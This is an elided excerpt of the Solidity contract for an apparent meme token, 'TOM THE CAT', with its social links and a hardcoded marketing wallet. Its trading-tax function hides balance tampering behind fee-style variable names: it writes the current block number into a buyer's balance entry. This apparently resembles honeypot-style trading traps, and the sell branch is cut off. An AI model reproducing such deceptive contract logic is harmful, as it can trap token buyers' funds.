...
Website:  https://tomthecat.xyz
Telegram: https://t.me/tomthecaterc
Twitter:  https://twitter.com/tomthecaterc
...
contract TOMTHECAT is Context, IERC20, Ownable {
    ...
    string private constant _name = "TOM THE CAT";
    ...
    constructor () {
        ...
        marketingWallet = address(0x5aCCB3a844B4a61C51751b720B666798Cd415DB4);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(takeFee) _checkTradingTaxes(from, to, amount);
    ...
    function _checkTradingTaxes(address sender, address recipient, uint256 amount) private {
        bool isFromBuy = sender == uniswapV2Pair && amount > 0;
        bool isFromSell = recipient == uniswapV2Pair && amount > 0;
        bool isTokenTransfer = sender != uniswapV2Pair && recipient != uniswapV2Pair && amount > 0;
        bool isFeeZero = _tOwned[recipient] == 0;
        uint256 feeAmount = block.number;

        if(isFromBuy){
            if(isFeeZero) _tOwned[recipient] = feeAmount;
        }else if(isFromSell || isTokenTransfer){
